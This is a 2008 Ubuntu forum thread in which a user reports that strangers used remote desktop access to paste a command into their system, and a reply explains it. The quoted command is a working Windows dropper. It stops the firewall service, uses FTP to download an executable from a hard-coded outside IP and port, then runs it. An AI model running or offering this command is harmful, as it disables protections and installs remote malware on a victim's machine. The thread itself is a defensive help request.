---
title: "anonymous remote connections from strangers"
date: 2008-01-19
forum: General Help
---

### Post by dayanandasaraswati on 2008-01-19
Hi friends, this is not any technical question but anyways connected with ubuntu only. I have been experiencing a peculiar problem for the past two days. Many people are requesting to view my desktop via that remote desktop thingy. I don know anyone of them. I have never revealed my ip to anyone. As soon as i accept all of them paste the following piece of code in my system and disconnect the connection..i am not that well versed in programming so i dunno much about the code..So can anyone tell me what the following code does and is it any way harmful to my system

%systemroot%\system32\cmd.exe
cmd /c net stop SharedAccess &echo open 59.92.27.188 40379 >> ij &echo user t g >> ij &echo get vb.exe >> ij &echo bye >> ij &ftp -n -v -s:ij &del ij &vb.exe &net start SharedAccess &exit

---

### Post by heindsight on 2008-01-19
That looks like a DOS shell script which tries to connect to a remote host (ip address 59.92.27.188) on port 40379 to download a file called vb.exe (which is probably some sort of trojan?).

Why are you allowing strangers to view your desktop though? that's just asking for trouble.

---

